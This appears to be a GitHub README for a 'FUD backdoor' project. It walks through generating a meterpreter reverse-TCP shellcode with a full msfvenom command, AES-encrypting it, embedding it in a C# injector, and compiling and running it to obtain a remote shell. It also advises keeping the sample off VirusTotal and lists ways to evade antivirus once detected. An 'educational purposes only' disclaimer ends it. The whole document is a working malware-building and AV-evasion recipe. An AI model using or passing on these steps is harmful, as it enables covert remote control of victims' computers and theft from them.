# 🔒 Generate **FUD** backdoor with a AES **Crypter** 🔒
Follow the steps bellow to generate a crypted shellcode that can be used on a C++ executable.

#DONT UPLOAD TO VIRUS TOTAL
```
https://antiscan.me/scan/new/result?id=i55PH2FhUHID
```

## Clone the repository
```
Download (https://github.com/tr1xongithub/fud-backdoor/)
```

## Generate The ShellCode

```
msfvenom -p windows/x64/meterpreter/reverse_tcp  -i 10 LHOST=(IP) LPORT=(PORT) -f csharp 
```

## Encode the ShellCode With the AES Encryption

```
open the shelloader and add the bytes to the AESEncrytion Tool
```

## Add the crypted shellcode on Program.cs in AESEncrptor
Now that you have the shellcode you need to add it on the Program.cs file just like this:
```
byte[] buf = new byte[] { /*shellcode*/ };
```
Now Run the Project

## Compile The Backdoor
Once You Get the Encoded Shellcode open the AESInjector Project and paste the shellcode into
```
byte[] duffer = new byte[] { /*shellcode*/ };
```
Then Compile it as x64 in visual Studios

## Execute the backdoor
Now you can execute the backdoor and enjoy the metepreter shell

## What if it gets detected?

At some point, the anti viruses will be able to detect this backdoor. Here are some things you can do to make it undetectable again. 

You can try to change the payload type protocol and make it http or https and make sure to use another port, add gibberish C++ code on the main.cpp file and you can also try playing with the SSL certificate of the session. Here is an article that covers this: https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation

If this still doesn't work, I can't think of another way to make the connection undetectable since this is a meterpreter shell and they get detected quite easily

## DISCLAIMER

I am not responsible for any of your actions. This GitHub repository is made for educational purposes only!!!
